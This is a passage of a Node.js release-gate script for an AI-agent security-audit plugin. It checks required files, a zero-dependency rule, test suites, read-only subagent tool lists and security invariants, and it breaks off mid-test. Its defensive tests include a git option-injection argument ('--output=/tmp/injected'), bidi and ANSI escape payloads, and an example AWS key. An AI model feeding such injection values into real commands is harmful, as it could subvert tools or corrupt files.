#!/usr/bin/env node
/**
 * check-release-invariants.mjs
 * Section 24 Release Invariants Gate for AGY Security Audit.
 * Formally validates that 100% of required specifications, contracts,
 * scripts, and test invariants are intact before milestone release.
 */

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFileSync } from 'node:child_process';
import {
  deriveFinalDisposition,
  reconcileCoverage,
  validateReviewManifest,
  validateDirectoryManifest,
  validateCvssV4,
  redactSecrets,
  stripControlAndBidi,
  renderSarifFromCanonical,
  finalizeScan,
  validateDiscoveryCell,
  validateDiscoveryMatrix,
  computeLineageFingerprint,
  validateFindingLineage,
  computeFindingFingerprint,
  calculateEvidenceSufficiency,
  deriveAuthoritativeEvidenceSufficiency,
  validateFindingType,
  VALID_FINDING_TYPES,
  validateSafeProof,
  VALID_PROOF_KINDS,
  validateCanonicalFindings,
  FAILURE_REASON_CODES,
  deriveReasonCode,
  computeEvidenceSnapshot,
  isEvidenceStale,
  inferSecurityProperty,
  ingestExternalEvidence,
  buildExecutionAttestation,
  resolveStandardsMapping,
  detectDependencyBoundary,
  inferDefectManagement,
  buildAuditBaseline,
  normalizeDirectoryStatus,
  tokenizeSecretsForContext,
  detokenizeSecrets,
  computeExecutionEquivalenceKey,
  validateRiskAcceptance,
  verifyToolSelfIntegrity,
  runCalibrationCanaries,
  runDispositionCanaries,
  prepareReviewContext,
  readPreparedFile,
  getPreparedContextFilePath,
  generateToolIntegrityManifest,
  isPathContained,
  resolveExternalUri,
  isAuthoritativeClean,
  computeCanonicalArtifactHashes,
  validateCrossFormatParity,
  loadProjectSecurityContext,
  detectContextDrift,
  computeProjectContextFingerprint,
  computeSecurityPropertiesFingerprint,
  initProjectContext,
  loadBaselineContext,
  persistBaselineContext,
  evaluateSecondOpinion,
  validateThreatModel
} from './finalize-scan.mjs';
import { validateAttackPath } from './validate-attack-path.mjs';
import { verifyRemediation } from './validate-patch.mjs';
import { buildDirectoryManifest, classifyFile, categorizeDirectory, buildScanManifest } from './build-inventory.mjs';
import { buildThreatModel, detectRepositoryInventory, generateDiscoveryMatrix } from './build-threat-model.mjs';
import { HARDENED_GIT_ENV, getHardenedGitProvenance, resolveGitCommitRef } from './safe-git.mjs';
import { evaluateDiscovery, generateSimulatedCandidates, runDiscoveryEval } from './run-discovery-eval.mjs';
import { evaluateStability, computeJaccardSimilarity, generateSimulatedRuns, evaluateCorpusStability, runStabilityEval } from './run-stability-eval.mjs';
import { createBenchmarkRunEnvelope, validateBenchmarkRunEnvelope, validatePermissionsProfile, validateAllAgentContracts } from './record-benchmark-run.mjs';

const REQUIRED_FILES = [
  'LICENSE',
  'README.md',
  'SECURITY.md',
  'plugin.json',
  'hooks.json',
  'hooks/shadow-context-guard.mjs',
  'rules/AGENTS.md',
  'skills/security-audit/SKILL.md',
  'skills/security-audit/tool-integrity-manifest.json',
  'skills/security-audit/scripts/safe-git.mjs',
  'skills/security-audit/scripts/finalize-scan.mjs',
  'skills/security-audit/scripts/render-sarif.mjs',
  'skills/security-audit/scripts/build-inventory.mjs',
  'skills/security-audit/scripts/build-threat-model.mjs',
  'skills/security-audit/scripts/project-context.mjs',
  'skills/security-audit/scripts/validate-attack-path.mjs',
  'skills/security-audit/scripts/validate-patch.mjs',
  'skills/security-audit/scripts/prepare-review-context.mjs',
  'skills/security-audit/scripts/path-containment.mjs',
  'skills/security-audit/scripts/standards-mapping.mjs',
  'skills/security-audit/scripts/run-evals.mjs',
  'skills/security-audit/scripts/run-semantic-eval.mjs',
  'skills/security-audit/scripts/run-discovery-eval.mjs',
  'skills/security-audit/scripts/run-stability-eval.mjs',
  'skills/security-audit/scripts/record-benchmark-run.mjs',
  'skills/security-audit/scripts/check-release-invariants.mjs',
  'skills/security-audit/standards/standards-map.json',
  'skills/security-audit/standards/applicability-profiles.json',
  'skills/security-audit/jobs/scan.md',
  'skills/security-audit/jobs/review.md',
  'skills/security-audit/jobs/validate.md',
  'skills/security-audit/jobs/deep.md',
  'skills/security-audit/jobs/remediate.md',
  'skills/security-audit/jobs/verify-fix.md',
  'skills/security-audit/references/discovery.md',
  'skills/security-audit/references/patching-jail.md',
  'skills/security-audit/references/swarm-consensus.md',
  'skills/security-audit/references/threat-modeling.md',
  'skills/security-audit/references/verifier-protocol.md',
  'skills/security-audit/references/finding-lineage.md',
  'skills/security-audit/references/safe-proof-policy.md',
  'skills/security-audit/references/model-independence.md',
  'schemas/scan-manifest.schema.json',
  'schemas/threat-model.schema.json',
  'schemas/candidate.schema.json',
  'schemas/candidate-set.schema.json',
  'schemas/verifier-ballot.schema.json',
  'schemas/verifier-ballot-set.schema.json',
  'schemas/canonical-finding.schema.json',
  'schemas/execution-attestation.schema.json',
  'schemas/audit-baseline.schema.json',
  'schemas/empirical-benchmark-run.schema.json',
  'agents/threat-modeler.md',
  'agents/discovery-agent.md',
  'agents/verifier-reachability.md',
  'agents/verifier-defenses.md',
  'agents/verifier-impact.md',
  'agents/security-audit-coordinator.md',
  'recommended-security-audit-permissions.json',
  'schemas/permissions-profile.schema.json'
];

/**
 * Validates repository release invariants.
 */
export function checkReleaseInvariants(repoRoot = process.cwd()) {
  const errors = [];
  const warnings = [];

  // 1. Check file completeness
  for (const relPath of REQUIRED_FILES) {
    const fullPath = path.resolve(repoRoot, relPath);
    if (!fs.existsSync(fullPath)) {
      errors.push(`Missing required release artifact: ${relPath}`);
    } else {
      const content = fs.readFileSync(fullPath, 'utf8');
      if (content.trim().length === 0) {
        errors.push(`Required release artifact is empty: ${relPath}`);
      }
      const isSelf = relPath.endsWith('check-release-invariants.mjs');
      if (!isSelf && /\bplaceholder\b/i.test(content)) {
        errors.push(`File contains unresolved placeholder: ${relPath}`);
      }
    }
  }

  // 2. Check package.json zero-dependency invariant across all dependency fields
  const pkgPath = path.resolve(repoRoot, 'package.json');
  if (!fs.existsSync(pkgPath)) {
    errors.push('Missing package.json');
  } else {
    try {
      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      const depFields = ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies'];
      for (const field of depFields) {
        if (pkg[field] && Object.keys(pkg[field]).length > 0) {
          errors.push(`Release invariant violation: external ${field} found in package.json: ${Object.keys(pkg[field]).join(', ')}`);
        }
      }
    } catch (e) {
      errors.push(`Failed to parse package.json: ${e.message}`);
    }
  }

  // 3. Check automated test suite
  const testScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/render-sarif.mjs');
  try {
    const stdout = execFileSync(process.execPath, [testScriptPath, '--test'], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('All render-sarif.mjs automated verification tests passed successfully')) {
      errors.push('Test suite did not output successful completion signature');
    }
  } catch (err) {
    errors.push(`Automated test suite failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.1 Check Deterministic Security Invariant & Adversarial Regression Suite (50 Cases) (P2-02, R1-P2-01)
  const evalsScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-evals.mjs');
  try {
    const stdout = execFileSync(process.execPath, [evalsScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('All 50/50 deterministic security invariant and adversarial regression tests passed cleanly!')) {
      errors.push('Deterministic Adversarial Regression Suite did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`Deterministic Adversarial Regression Suite failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.2 Check L1.5 Disposition Ground-Truth Benchmark (R1-P2-01 / R2-P0-08)
  const semanticScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-semantic-eval.mjs');
  try {
    const stdout = execFileSync(process.execPath, [semanticScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('disposition ground-truth invariant tests passed deterministically')) {
      errors.push('L1.5 Disposition Ground-Truth Benchmark did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`L1.5 Disposition Ground-Truth Benchmark failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.3 Check Real Agent Discovery Evaluation Benchmark (R2-P0-08)
  const discoveryScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-discovery-eval.mjs');
  try {
    const stdout = execFileSync(process.execPath, [discoveryScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('Discovery evaluation suite completed successfully')) {
      errors.push('Real Agent Discovery Evaluation Benchmark did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`Real Agent Discovery Evaluation Benchmark failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 3.4 Check Multi-Run Stochastic Stability Benchmark (R2-P0-08)
  const stabilityScriptPath = path.resolve(repoRoot, 'skills/security-audit/scripts/run-stability-eval.mjs');
  try {
    const stdout = execFileSync(process.execPath, [stabilityScriptPath], {
      cwd: repoRoot,
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'pipe']
    });
    if (!stdout.includes('Stability evaluation suite completed successfully')) {
      errors.push('Multi-Run Stochastic Stability Benchmark did not output clean pass signature');
    }
  } catch (err) {
    errors.push(`Multi-Run Stochastic Stability Benchmark failed: ${err.message}\n${err.stderr || ''}`);
  }

  // 4. Validate Plugin Custom Agents Capability & Tool Invariants (P0-04)
  const agentFiles = [
    'agents/threat-modeler.md',
    'agents/discovery-agent.md',
    'agents/verifier-reachability.md',
    'agents/verifier-defenses.md',
    'agents/verifier-impact.md'
  ];
  for (const af of agentFiles) {
    const p = path.resolve(repoRoot, af);
    if (fs.existsSync(p)) {
      const content = fs.readFileSync(p, 'utf8');
      if (!content.includes('mainAgent: false')) {
        errors.push(`Agent invariant violation: ${af} must declare mainAgent: false`);
      }
      if (!content.includes('subagent: true')) {
        errors.push(`Agent invariant violation: ${af} must declare subagent: true`);
      }
      if (!content.includes('commandExecutionPolicy: off')) {
        errors.push(`Agent invariant violation: ${af} must declare commandExecutionPolicy: off`);
      }
      if (content.includes('read_file')) {
        errors.push(`Agent invariant violation: ${af} contains deprecated/invalid tool name 'read_file'; must use 'view_file'`);
      }
      if (content.includes('run_command') || content.includes('write_to_file') || content.includes('replace_file_content')) {
        errors.push(`Agent invariant violation: ${af} contains prohibited modifying/execution tools`);
      }
      if (/(?:^|\n)\s*permissions\s*:/i.test(content)) {
        errors.push(`Agent invariant violation: ${af} contains unofficial/deprecated 'permissions:' block; must rely on official tools and commandExecutionPolicy (R1-P2-03)`);
      }
      const toolMatch = content.match(/tools:\s*\n((?:\s*-\s*[a-zA-Z0-9_]+\s*\n)+)/);
      if (toolMatch) {
        const declaredTools = toolMatch[1].split('\n')
          .map(l => l.replace(/^\s*-\s*/, '').trim())
          .filter(Boolean);
        const allowedTools = new Set(['view_file', 'list_dir', 'grep_search', 'find_by_name']);
        for (const t of declaredTools) {
          if (!allowedTools.has(t)) {
            errors.push(`Agent invariant violation: ${af} declares non-whitelisted tool '${t}'`);
          }
        }
      }
    }
  }


  // 5. Validate Orchestration & Verification Invariant Consistency (P1-04)
  const skillPath = path.resolve(repoRoot, 'skills/security-audit/SKILL.md');
  if (fs.existsSync(skillPath)) {
    const skillContent = fs.readFileSync(skillPath, 'utf8');
    if (skillContent.includes('--workers')) {
      errors.push('SKILL.md contains legacy --workers parameter; must use --concurrency');
    }
    if (!skillContent.includes('Fixed 3-Lens')) {
      errors.push('SKILL.md must document Fixed 3-Lens verification panel');
    }
  }

  // 6. Authoritative Security Invariants Gate (P2-01)
  const securityInvariants = [
    {
      id: 'SEC-INV-01',
      name: 'no self-certified consensus',
      check: () => {
        const candidate = {
          id: 'INV-1',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10, endLine: 10 },
          consensus: { verdict: 'CONFIRMED' }
        };
        const res = deriveFinalDisposition(candidate, []);
        if (res.disposition === 'REPORTABLE' || res.mappedVerdict === 'CONFIRMED') {
          throw new Error('Self-asserted candidate.consensus was accepted as REPORTABLE/CONFIRMED without verifier ballots');
        }
      }
    },
    {
      id: 'SEC-INV-02',
      name: 'zero votes cannot REPORTABLE',
      check: () => {
        const candidate = {
          id: 'INV-2',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10, endLine: 10 }
        };
        const res = deriveFinalDisposition(candidate, []);
        if (res.disposition !== 'DEFERRED' || res.mappedVerdict !== 'NEEDS_MANUAL_REVIEW') {
          throw new Error(`Zero-vote candidate did not default-deny to DEFERRED: ${JSON.stringify(res)}`);
        }
      }
    },
    {
      id: 'SEC-INV-03',
      name: 'raw sourceVerified cannot self-certify',
      check: () => {
        const candidate = {
          id: 'INV-3',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10, endLine: 10 },
          sourceVerified: true,
          dataflowVerified: true,
          isSingleCandidate: true
        };
        const res = deriveFinalDisposition(candidate, []);
        if (res.disposition !== 'DEFERRED') {
          throw new Error('Raw candidate evidence flags granted authority without independent verifier ballots');
        }
      }
    },
    {
      id: 'SEC-INV-04',
      name: 'filesystem coverage reconciliation',
      check: () => {
        const fakeManifest = { entries: [{ path: 'agents/', status: 'SCANNED' }] };
        const res = reconcileCoverage(fakeManifest, repoRoot);
        if (res.status === 'COMPLETE') {
          throw new Error('Incomplete filesystem manifest falsely achieved COMPLETE coverage');
        }
      }
    },
    {
      id: 'SEC-INV-05',
      name: 'git diff coverage reconciliation',
      check: () => {
        const identicalRevs = {
          mode: 'review',
          base: 'HEAD',
          head: 'HEAD',
          reviewInventory: { changedFiles: [], deletedFiles: [] }
        };
        const res = reconcileCoverage(identicalRevs, repoRoot);
        if (res.status === 'COMPLETE') {
          throw new Error('Review manifest with identical base/head revisions falsely achieved COMPLETE coverage');
        }
      }
    },
    {
      id: 'SEC-INV-06',
      name: 'deleted-file accounting',
      check: () => {
        const fakeDeletedManifest = {
          mode: 'review',
          reviewInventory: {
            changedFiles: [],
            deletedFiles: [{ path: 'unaccounted-fake-deleted-file.js', status: 'DELETED' }]
          }
        };
        const res = validateReviewManifest(fakeDeletedManifest, repoRoot);
        if (res.status === 'COMPLETE') {
          throw new Error('Fictitious deleted file entry in review inventory was accepted as COMPLETE');
        }
      }
    },
    {
      id: 'SEC-INV-07',
      name: 'canonical-only renderer',
      check: () => {
        const canonicalFinding = {
          id: 'INV-7',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1, endLine: 1 },
          disposition: 'DEFERRED',
          mappedVerdict: 'NEEDS_MANUAL_REVIEW',
          title: 'Unverified Finding'
        };
        const sarif = renderSarifFromCanonical({ canonicalFindings: [canonicalFinding] });
        if (sarif.runs[0].results.length !== 1 || sarif.runs[0].results[0].properties.disposition !== 'DEFERRED') {
          throw new Error('Canonical renderer failed to preserve canonical finding disposition');
        }
        // R1-P1-03: Fabricated REPORTABLE claim without consensus is downgraded to DEFERRED
        const fakeReportable = {
          id: 'INV-7-FAKE',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1, endLine: 1 },
          disposition: 'REPORTABLE',
          verdict: 'CONFIRMED',
          title: 'Fake Confirmed',
          consensus: { supports: 0, totalVotes: 0 },
          rigor: { score: 0.1 }
        };
        const sarifFake = renderSarifFromCanonical({ canonicalFindings: [fakeReportable] });
        if (sarifFake.runs[0].results[0].properties.disposition !== 'DEFERRED') {
          throw new Error('Canonical renderer accepted fabricated REPORTABLE finding without verifier consensus');
        }
      }
    },
    {
      id: 'SEC-INV-08',
      name: 'all verifier REFUTES evidence-bound',
      check: () => {
        const candidate = { id: 'INV-8', location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10 } };
        const unverifiedRefute = [
          { findingId: 'INV-8', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'Unverified claim with no evidence' }
        ];
        const res = deriveFinalDisposition(candidate, unverifiedRefute, { score: 0.8 }, repoRoot);
        if (res.disposition === 'SUPPRESSED') {
          throw new Error('Unverified REFUTES ballot without concrete code evidence suppressed finding to FALSE_POSITIVE');
        }
        if (res.disposition !== 'DEFERRED') {
          throw new Error('Unverified REFUTES ballot did not fail closed to DEFERRED');
        }
      }
    },
    {
      id: 'SEC-INV-09',
      name: 'verify-fix requires all 3 lenses',
      check: () => {
        const finding = { id: 'INV-9', ruleId: 'CWE-89', location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 10 } };
        // 1 DEFENSES vote only -> REJECTED
        const oneVote = [
          { findingId: 'INV-9', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/security-audit/scripts/safe-git.mjs:10', mitigationReason: 'barrier added' }
        ];
        const res1 = verifyRemediation(finding, oneVote, process.cwd());
        if (res1.verified) {
          throw new Error('Remediation verified with only 1 lens instead of all 3 required lenses');
        }
        // 2 votes only (DEFENSES + REACHABILITY) -> REJECTED
        const twoVotes = [
          { findingId: 'INV-9', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'skills/security-audit/scripts/safe-git.mjs:10', mitigationReason: 'barrier added' },
          { findingId: 'INV-9', lens: 'REACHABILITY', decision: 'REFUTES', reason: 'blocked', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 10, role: 'dead-path' }] }
        ];
        const res2 = verifyRemediation(finding, twoVotes, process.cwd());
        if (res2.verified) {
          throw new Error('Remediation verified with only 2 lenses instead of all 3 required lenses');
        }

        // 3 votes with fake evidence -> REJECTED (R1-P0-02)
        const fakeThreeVotes = [
          { findingId: 'INV-9', lens: 'DEFENSES', decision: 'REFUTES', mitigationProofLine: 'totally/fake.js:999999', mitigationReason: 'trust me' },
          { findingId: 'INV-9', lens: 'REACHABILITY', decision: 'REFUTES', evidence: [{ path: 'totally/fake.js', line: 10, role: 'dead-path' }] },
          { findingId: 'INV-9', lens: 'IMPACT', decision: 'REFUTES', evidence: [{ path: 'totally/fake.js', line: 10, role: 'impact-boundary' }] }
        ];
        const res3 = verifyRemediation(finding, fakeThreeVotes, process.cwd());
        if (res3.verified) {
          throw new Error('Remediation verified with fake evidence paths instead of verified patched tree');
        }
      }
    },
    {
      id: 'SEC-INV-10',
      name: 'CVSS exact vector rejection',
      check: () => {
        const validVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N';
        const validRes = validateCvssV4({ vector: validVector });
        if (!validRes.valid || validRes.score !== null) {
          throw new Error('Valid CVSS v4 vector was unexpectedly rejected');
        }

        const badVectorWithSuffix = `${validVector}/EXTRA`;
        const res = validateCvssV4({ vector: badVectorWithSuffix });
        if (res.valid) {
          throw new Error('CVSS v4 vector with illegal suffix was accepted (missing $ anchor)');
        }
        const outOfBounds = validateCvssV4({ score: 11.5, vector: validVector });
        if (outOfBounds.valid) {
          throw new Error('Out of bounds CVSS score (11.5) was accepted or clamped instead of fail-closed rejection');
        }

        // R1-P1-04: Inconsistent CVSS score/vector rejection
        const inconsistentZeroImpact = validateCvssV4({
          vector: 'CVSS:4.0/AV:P/AC:H/AT:P/PR:H/UI:A/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N',
          score: 10.0,
          severity: 'CRITICAL'
        });
        if (inconsistentZeroImpact.valid) {
          throw new Error('Inconsistent zero-impact CVSS vector with score 10.0 was accepted');
        }
      }
    },
    {
      id: 'SEC-INV-11',
      name: 'no raw-secret leakage',
      check: () => {
        const rawSecret = 'AKIAIOSFODNN7EXAMPLE';
        const text = `const awsKey = "${rawSecret}";`;
        const redacted = redactSecrets(text);
        if (redacted.includes(rawSecret)) {
          throw new Error(`Raw secret leaked into redacted output: ${redacted}`);
        }
        if (!redacted.includes('[REDACTED_AWS_ACCESS_KEY')) {
          throw new Error(`Redacted secret lacks fingerprint prefix: ${redacted}`);
        }
      }
    },
    {
      id: 'SEC-INV-12',
      name: 'Git hostile config cannot execute',
      check: () => {
        if (!HARDENED_GIT_ENV.GIT_CONFIG_GLOBAL || !HARDENED_GIT_ENV.GIT_CONFIG_SYSTEM) {
          throw new Error('HARDENED_GIT_ENV does not isolate global/system git config');
        }
        if (HARDENED_GIT_ENV.GIT_EXTERNAL_DIFF !== '') {
          throw new Error('HARDENED_GIT_ENV does not neutralize GIT_EXTERNAL_DIFF execution hook');
        }
        if (HARDENED_GIT_ENV.GIT_PAGER !== 'cat' || HARDENED_GIT_ENV.PAGER !== 'cat') {
          throw new Error('HARDENED_GIT_ENV does not neutralize GIT_PAGER/PAGER hooks');
        }
        // R1-P1-02: Subcommand option injection defense
        try {
          resolveGitCommitRef(process.cwd(), '--output=/tmp/injected');
          throw new Error('resolveGitCommitRef failed to reject --output option injection');
        } catch (e) {
          if (!e.message.includes('Refusal to parse ref starting with \'-\'')) {
            throw e;
          }
        }
      }
    },
    {
      id: 'SEC-INV-13',
      name: 'Markdown / ANSI / Bidi injection blocked',
      check: () => {
        const bidiPayload = 'Normal Text \u202E Reversed Injection';
        const sanitizedBidi = stripControlAndBidi(bidiPayload);
        if (sanitizedBidi.includes('\u202E')) {
          throw new Error('stripControlAndBidi failed to strip Unicode Bidi override character');
        }
        const ansiPayload = '\u001b[31mRed Alert\u001b[0m';
        const sanitizedAnsi = stripControlAndBidi(ansiPayload);
        if (sanitizedAnsi.includes('\u001b')) {
          throw new Error('stripControlAndBidi failed to strip ANSI escape code');
        }
      }
    },
    {
      id: 'SEC-INV-14',
      name: 'ZIP-clean test harness',
      check: () => {
        // 1. Assert zero release artifacts depend on .git presence
        for (const req of REQUIRED_FILES) {
          if (req.includes('.git')) {
            throw new Error(`Release invariant violation: REQUIRED_FILES includes git path: ${req}`);
          }
        }
        // 2. Assert fallback git provenance operates safely when .git is absent
        const nonGitDir = path.join(os.tmpdir(), 'sec-audit-zip-clean-check');
        const nonGitProvenance = getHardenedGitProvenance(nonGitDir);
        if (nonGitProvenance.branch !== 'unknown' || nonGitProvenance.revisionId !== '0000000000000000000000000000000000000000') {
          throw new Error('getHardenedGitProvenance failed to produce safe fallback in non-git directory');
        }
      }
    },
    {
      id: 'SEC-INV-15',
      name: 'SUPPORTS without evidence cannot REPORTABLE',
      check: () => {
        const candidate = {
          id: 'INV-15',
          location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 25 },
          rigorMetrics: {
            sinkVerified: true,
            sourceVerified: true,
            dataflowTotalSteps: 1,
            dataflowVerifiedSteps: 1,
            mitigationInspected: true
          }
        };
        // 1. 3 SUPPORTS with empty evidence -> DEFERRED
        const noEvVotes = [
          { findingId: 'INV-15', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [] },
          { findingId: 'INV-15', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [] },
          { findingId: 'INV-15', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [] }
        ];
        const resNoEv = deriveFinalDisposition(candidate, noEvVotes, { score: 0.85 }, repoRoot);
        if (resNoEv.disposition !== 'DEFERRED') {
          throw new Error('3 SUPPORTS votes without evidence achieved non-DEFERRED disposition');
        }

        // 2. Fake rigorMetrics on candidate cannot grant REPORTABLE without validated evidence
        const arbitraryEvVotes = [
          { findingId: 'INV-15', lens: 'REACHABILITY', decision: 'SUPPORTS', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 10, role: 'general' }] },
          { findingId: 'INV-15', lens: 'DEFENSES', decision: 'SUPPORTS', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 15, role: 'control' }] },
          { findingId: 'INV-15', lens: 'IMPACT', decision: 'SUPPORTS', evidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 20, role: 'general' }] }
        ];
        const resFakeRigor = deriveFinalDisposition(candidate, arbitraryEvVotes, { score: 0.95 }, repoRoot);
        if (resFakeRigor.disposition === 'REPORTABLE') {
          throw new Error('Fake candidate rigorMetrics granted REPORTABLE without validated source evidence');
        }
      }
    },
    {
      id: 'SEC-INV-16',
      name: 'Zero-Candidate Discovery Cell & Audit Intent Convergence',
      check: () => {
        const validCell = {
          component: 'Auth',
          family: 'auth/authz/tenancy',
          status: 'REVIEWED_NO_CANDIDATE',
          reviewedEvidence: [{ path: 'skills/security-audit/scripts/safe-git.mjs', line: 1 }],
          notes: 'No unmitigated vulnerabilities found.'
        };
        const cellRes = validateDiscoveryCell(validCell, repoRoot);
        if (!cellRes.valid) {
          throw new Error(`Valid REVIEWED_NO_CANDIDATE cell failed validation: ${cellRes.error}`);
        }

        const badCell = {
          component: 'Auth',
          family: 'auth/authz/tenancy',
          status: 'REVIEWED_NO_CANDIDATE',
          reviewedEvidence: []
        };
        if (validateDiscoveryCell(badCell, repoRoot).valid) {
          throw new Error('REVIEWED_NO_CANDIDATE accepted without inspection evidence');
        }

        const cleanManifest = buildDirectoryManifest(repoRoot);
        const cleanRun = finalizeScan({
          candidates: [],
          manifest: cleanManifest,
          repoRoot,
          auditIntent: 'REGRESSION',
          discoveryMatrix: [validCell],
          allowSelfAudit: true
        });
        if (!cleanRun.summary.canDeclareClean || cleanRun.summary.auditIntent !== 'REGRESSION') {
          throw new Error('Zero candidate run with complete coverage failed to achieve bounded clean assurance');
        }

        // Validate matrix fail-closed behavior
        const invalidMatrix = [validCell, { component: 'Bad', family: 'fam', status: 'INVALID_STATUS' }];
        const matRes = validateDiscoveryMatrix(invalidMatrix, repoRoot);
        if (matRes.valid) {
          throw new Error('validateDiscoveryMatrix accepted invalid cell status');
        }
        const malformedRun = finalizeScan({
          candidates: [],
          manifest: cleanManifest,
          repoRoot,
          discoveryMatrix: invalidMatrix
        });
        if (malformedRun.summary.canDeclareClean) {
          throw new Error('finalizeScan allowed canDeclareClean: true with invalid discovery matrix');
        }
      }
    },
    {
      id: 'SEC-INV-17',
      name: 'Finding Lineage & Fingerprint v2 Line-Shift Invariance',
      check: () => {
        // 1. Line-shift invariance of lineageId
        const idLine10 = computeLineageFingerprint({
          ruleId: 'CWE-89',
          uri: 'src/db.ts',
          component: 'Database',
          family: 'injection/query/template/eval',
          symbol: 'executeRawQuery'
        });
        const idLine250 = computeLineageFingerprint({
          ruleId: 'CWE-89',
          uri: 'src/db.ts',
          component: 'Database',
          family: 'injection/query/template/eval',
          symbol: 'executeRawQuery'
        });
        if (idLine10 !== idLine250) {
          throw new Error('computeLineageFingerprint is not deterministic across invocations');
        }

        // 2. Exact location fingerprint differs across lines
        const locFp1 = computeFindingFingerprint('CWE-89', 'src/db.ts', 10);
        const locFp2 = computeFindingFingerprint('CWE-89', 'src/db.ts', 250);
        if (locFp1 === locFp2) {
          throw new Error('computeFindingFingerprint failed to differentiate different line numbers');
        }

        // 3. validateFindingLineage rejects invalid novelty
        const badNov = validateFindingLineage({ novelty: 'SUPER_NOVEL' });
        if (badNov.valid) {
          throw new Error('validateFindingLineage accepted invalid novelty state');
        }

        // 4. validateFindingLineage requires whyNow on FIX_INTRODUCED and PREVIOUSLY_MISSED
        const fixNoWhy = validateFindingLineage({ novelty: 'FIX_INTRODUCED', whyNow: '' });
        if (fixNoWhy.valid) {
          throw new Error('validateFindingLineage accepted FIX_INTRODUCED with empty whyNow');
        }
        const fixWithWhy = validateFindingLineage({ novelty: 'FIX_INTRODUCED', whyNow: 'Fix introduced new parameter' });
        if (!fixWithWhy.valid) {
          throw new Error('validateFindingLineage rejected valid FIX_INTRODUCED with whyNow');
        }
      }
    },
    {
      id: 'SEC-INV-18',
      name: 'CVSS v4.0 Base Metric Vector (no heuristic guesswork) & Evidence Sufficiency',
      check: () => {
        // 1. CVSS v4 with score: null yields severity: 'UNRATED' (no heuristic deduction)
        const unratedVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N';
        const unratedRes = validateCvssV4({ vector: unratedVector, score: null });
        if (!unratedRes.valid || unratedRes.severity !== 'UNRATED') {
          throw new Error(`validateCvssV4 guessed or altered severity for unscored vector: got ${unratedRes.severity}`);
        }

        // 2. Zero-impact vector yields NONE
        const zeroVector = 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N';
        const zeroRes = validateCvssV4({ vector: zeroVector, score: null });
        if (!zeroRes.valid || zeroRes.severity !== 'NONE') {
          throw new Error(`validateCvssV4 failed to map zero-impact vector to NONE: got ${zeroRes.severity}`);
        }

        // 3. finalizeScan does NOT fallback invalid CVSS to MEDIUM; yields UNRATED
        const badCvssRun = finalizeScan({
          candidates: [{
            id: 'SEC-BAD-CVSS',
            ruleId: 'CWE-89',
            title: 'Bad CVSS candidate',
            location: { uri: 'skills/security-audit/scripts/safe-git.mjs', startLine: 1 },
            cvssV4: { vector: 'CVSS:4.0/AV:N/INVALID', score: 5.0 }
          }],
          repoRoot
        });
        if (badCvssRun.canonicalFindings[0].severity !== 'UNRATED') {
          throw new Error(`finalizeScan fell back invalid CVSS to ${badCvssRun.canonicalFindings[0].severity} instead of UNRATED`);
        }

        // 4. calculateEvidenceSufficiency returns structured completeness heuristic
        const suff = calculateEvidenceSufficiency({
          sourceVerified: true,
          sinkVerified: true,
          dataflowVerifiedSteps: 2,
          dataflowTotalSteps: 2,
          pocSyntacticDemonstrated: true,
          mitigationInspected: true
        });
        if (suff.score !== 1.0 || suff.sufficiencyLevel !== 'HIGH' || !suff.disclaimer) {
          throw new Error('calculateEvidenceSufficiency failed to produce valid sufficiency object with disclaimer');
        }
      }
    },
    {
      id: 'SEC-INV-19',
      name: 'Benchmark Truthfulness, Discovery Evaluation & Multi-Run Stability',
      check: () => {
        // 1. Jaccard similarity mathematical correctness
        const set1 = ['A', 'B', 'C'];
        const set2 = ['B', 'C', 'D'];
